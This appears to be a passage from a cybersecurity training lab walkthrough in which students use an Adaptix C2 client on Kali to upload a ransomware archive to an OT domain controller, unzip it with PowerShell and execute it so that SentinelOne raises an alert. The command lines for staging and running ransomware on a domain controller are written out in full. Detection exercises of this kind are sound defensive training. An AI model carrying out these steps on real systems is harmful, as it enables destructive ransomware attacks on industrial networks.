<div class="attacker-container">
<div class="attacker-label">Upload File to DC</div>

To Upload the Ransomware on to the OT Domain Controller. We will use the **upload** command in the **Adaptix Client** on the **Kali machine**. 

Let's start by connecting to the OT Domain controller on your Adaptix C2 Client **double click DC-OT-01** for a new CLI session.

![ransom-1.jpg](/images/ransom-1.jpg)

Then use this command to upload the Ransomware file onto the OT Domain Controller:
```upload /home/sysadmin/AdaptixProjects/ShadowHackers/danger_malware.exe.zip c:\VPN_Share\gmtmX.zip```

![Ransom-2.jpg](/images/Ransom-2.jpg)

</div>

<div class="attacker-container">
<div class="attacker-label">Run Ransomware</div>
	
Now for using the **Ransomware** we need to **unzip** the folder to the Desktop folder of Engineeringadmin.
	
You can achieve this by excecuting this command in the OT-DC:
```powershell Expand-Archive -LiteralPath "C:\VPN_Share\gmtmX.zip" -DestinationPath "C:\Users\Engineeringadmin\Desktop\gmtmX" -Force```
![Ransom-5.jpg](/images/Ransom-5.jpg)
	
At last **execute** the **ransmoware**:

```powershell Start-Process "C:\Users\Engineeringadmin\Desktop\gmtmX\danger_malware.exe"```

Make sure to use the commando for unizpping the folder to the Dekstop of engineeringadmin and name the folder gmtm with you student number. To recognize your alert in SentinelOne.
